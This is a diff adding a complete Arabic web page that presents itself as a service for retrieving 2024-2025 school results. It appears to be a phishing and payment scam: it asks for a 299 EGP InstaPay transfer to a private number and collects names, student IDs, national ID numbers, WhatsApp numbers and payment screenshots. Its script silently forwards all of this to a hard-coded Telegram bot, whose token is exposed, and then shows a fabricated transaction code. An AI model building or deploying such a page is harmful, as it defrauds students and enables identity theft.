@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استخراج نتيجة السنة الدراسية 2024-2025</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #f0f8ff, #e0f2f7); /* Light blue gradient */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            box-sizing: border-box;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 30px;
+            font-size: 2em;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right; /* Align labels to the right */
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #34495e;
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="tel"],
+        input[type="file"] {
+            width: calc(100% - 20px);
+            padding: 12px 10px;
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 1em;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        input[type="text"]:focus,
+        input[type="password"]:focus,
+        input[type="tel"]:focus,
+        input[type="file"]:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
+            outline: none;
+        }
+        input[type="file"] {
+            padding-top: 10px; /* Adjust padding for file input */
+        }
+        .instapay-section {
+            background-color: #f8f9fa;
+            border: 1px dashed #cccccc;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .instapay-section img {
+            max-width: 120px; /* Adjust size as needed */
+            margin-bottom: 15px;
+        }
+        .instapay-section p {
+            color: #495057;
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        .instapay-section span {
+            font-weight: bold;
+            color: #007bff;
+            direction: ltr; /* Ensure number displays LTR */
+            unicode-bidi: embed;
+        }
+        button {
+            background-color: #28a745; /* Green submit button */
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
+        }
+        .message {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #d4edda;
+            color: #155724;
+            border-radius: 10px;
+            border: 1px solid #c3e6cb;
+            display: none; /* Hidden by default */
+            animation: slideIn 0.5s ease-out;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .message p {
+            margin: 0;
+            font-size: 1.1em;
+        }
+        .message span {
+            font-weight: bold;
+            color: #0a4f00;
+        }
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px;
+                border-radius: 10px;
+            }
+            h1 {
+                font-size: 1.8em;
+                margin-bottom: 25px;
+            }
+            input, button {
+                font-size: 0.95em;
+            }
+            .instapay-section img {
+                max-width: 100px;
+            }
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.6em;
+                margin-bottom: 20px;
+            }
+            .instapay-section p {
+                font-size: 1em;
+            }
+            button {
+                padding: 12px 20px;
+                font-size: 1.1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>استخراج نتيجة السنة الدراسية 2024-2025</h1>
+        <form id="resultForm">
+            <div class="form-group">
+                <label for="fullName">الاسم كاملاً:</label>
+                <input type="text" id="fullName" name="fullName" required placeholder="الرجاء إدخال اسمك كاملاً">
+            </div>
+            <div class="form-group">
+                <label for="studentId">رقم الـ ID (رقم الطالب):</label>
+                <input type="tel" id="studentId" name="studentId" pattern="[0-9]*" inputmode="numeric" required placeholder="مثال: 123456789">
+            </div>
+            <div class="form-group">
+                <label for="nationalId">الرقم القومي (14 رقمًا):</label>
+                <input type="password" id="nationalId" name="nationalId" minlength="14" maxlength="14" required placeholder="الرجاء إدخال الرقم القومي المكون من 14 رقمًا">
+            </div>
+            <div class="form-group">
+                <label for="whatsappNumber">رقم الواتساب للتواصل وإرسال النتيجة:</label>
+                <input type="tel" id="whatsappNumber" name="whatsappNumber" pattern="[0-9]{11}" required placeholder="مثال: 01xxxxxxxx">
+            </div>
+
+            <div class="instapay-section">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/InstaPay_logo.png/640px-InstaPay_logo.png" alt="Instapay Logo">
+                <p>
+                    مطلوب إرسال مبلغ <span>299 جنيه مصري</span><br>
+                    على حساب انستاباي بالرقم: <span style="font-size: 1.2em;">01002525222</span>
+                </p>
+            </div>
+
+            <div class="form-group">
+                <label for="paymentScreenshot">صورة إثبات الدفع (سكرين شوت):</label>
+                <input type="file" id="paymentScreenshot" name="paymentScreenshot" accept="image/*" required>
+            </div>
+
+            <button type="submit">إرسال البيانات</button>
+        </form>
+
+        <div id="thankYouMessage" class="message">
+            <p><strong>شكرًا لك!</strong></p>
+            <p>سيتم التواصل معك خلال ساعة بخصوص النتيجة.</p>
+            <p>رقم كود العملية: <span id="transactionCode"></span></p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('resultForm');
+        const thankYouMessage = document.getElementById('thankYouMessage');
+        const transactionCodeSpan = document.getElementById('transactionCode');
+
+        const TELEGRAM_BOT_TOKEN = '7421349725:AAEC8l40CEfw2IBf0aoqJAc8OCUeOdWCX8'; // Replace with your bot token
+        const TELEGRAM_CHAT_ID = '1378872532'; // Replace with your chat ID
+
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const fullName = document.getElementById('fullName').value;
+            const studentId = document.getElementById('studentId').value;
+            const nationalId = document.getElementById('nationalId').value;
+            const whatsappNumber = document.getElementById('whatsappNumber').value;
+            const paymentScreenshotInput = document.getElementById('paymentScreenshot');
+            const paymentScreenshotFile = paymentScreenshotInput.files[0];
+
+            if (!paymentScreenshotFile) {
+                alert('الرجاء إرفاق صورة إثبات الدفع.');
+                return;
+            }
+
+            // Generate a simple transaction code
+            const transactionCode = 'TXN-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+
+            // Prepare text message for Telegram
+            let messageText = `طلب نتيجة جديد!\n\n`;
+            messageText += `الاسم: ${fullName}\n`;
+            messageText += `رقم الـ ID: ${studentId}\n`;
+            messageText += `الرقم القومي: ${nationalId}\n`;
+            messageText += `رقم الواتساب: ${whatsappNumber}\n`;
+            messageText += `كود العملية: ${transactionCode}\n`;
+
+            // Send text message to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                    }),
+                });
+            } catch (error) {
+                console.error('Error sending text message to Telegram:', error);
+                alert('حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.');
+                return;
+            }
+
+            // Send photo to Telegram
+            if (paymentScreenshotFile) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', paymentScreenshotFile);
+                formData.append('caption', `إثبات دفع لكود العملية: ${transactionCode}`);
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                    });
+                } catch (error) {
+                    console.error('Error sending photo to Telegram:', error);
+                    alert('حدث خطأ أثناء إرسال صورة الدفع. الرجاء المحاولة مرة أخرى.');
+                    return;
+                }
+            }
+
+            // Show thank you message and hide form
+            form.style.display = 'none';
+            transactionCodeSpan.textContent = transactionCode;
+            thankYouMessage.style.display = 'block';
+
+            // Optional: You can reset the form fields if needed for subsequent submissions,
+            // but for a single-page form where it disappears, it's not strictly necessary.
+            // form.reset();
+        });
+    </script>
+</body>
+</html>
